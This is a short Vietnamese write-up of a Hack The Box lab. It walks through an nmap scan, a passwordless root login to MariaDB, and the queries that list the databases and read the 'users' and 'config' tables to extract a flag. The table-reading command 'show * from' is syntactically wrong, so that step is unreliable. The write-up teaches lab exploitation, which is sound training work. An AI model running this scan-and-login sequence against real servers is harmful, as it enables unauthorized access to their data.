> Hiểu hơn về cách định hướng để tìm kiếm dữ liệu trong database
### 1. Tìm kiếm thông tin
###### IP: 10.129.39.254
##### + Tìm kiếm cổng và dịch vụ
` sudo nmap -sC -sV 10.129.39.254 `
##### => 3306/tcp mysql... : dịch vụ đang chạy là MySQL 5.5.5-10.3.27-MariaDB0+deb10u1
###### MySQL là dịch vụ quản lý database: khởi tạo, tùy chỉnh và cập nhật dữ liệu.
##### + Sử dụng MySQL để đăng nhập vào database của target:
` mysql -h 10.129.39.254 -u root `
###### -h: địa chỉ IP (hostname)
###### -u: username, mặc định là root
###### Để tên mặc định là một lỗi điển hình khi config
![image](https://github.com/WildSaul/HTB_StartingPoint_FreeMachines_AllTiers/assets/155133173/3cf7c13b-2281-46e9-b8f9-55ab8afdcc16)
### 2. Tìm kiếm thông tin sau khi exploit
##### + Sau khi được cấp cấp quyền truy cập vào mySQL thành công, bắt đầu tìm kiếm khai thác thông tin:
###### gõ /h hoặc help để xem thêm thông tin về cách sử dụng MariaDB
` MariaDB [(none)]> show databases; `
##### => 4 database sẽ xuất hiện, để chọn xem một database:
` MariaDB [(none)]> use htb;
##### + Xem các bảng trong database 'htb':
` show tables; `
##### => 2 table trong database: 'config' và 'users'
##### + Xem lần lượt các thông tin trong 2 table:
` show * from <tên bảng>; `
#####
![image](https://github.com/WildSaul/HTB_StartingPoint_FreeMachines_AllTiers/assets/155133173/1020464f-3627-4f9c-8417-473e6ca85b06)
##### Như vậy trích xuất flag thành công.
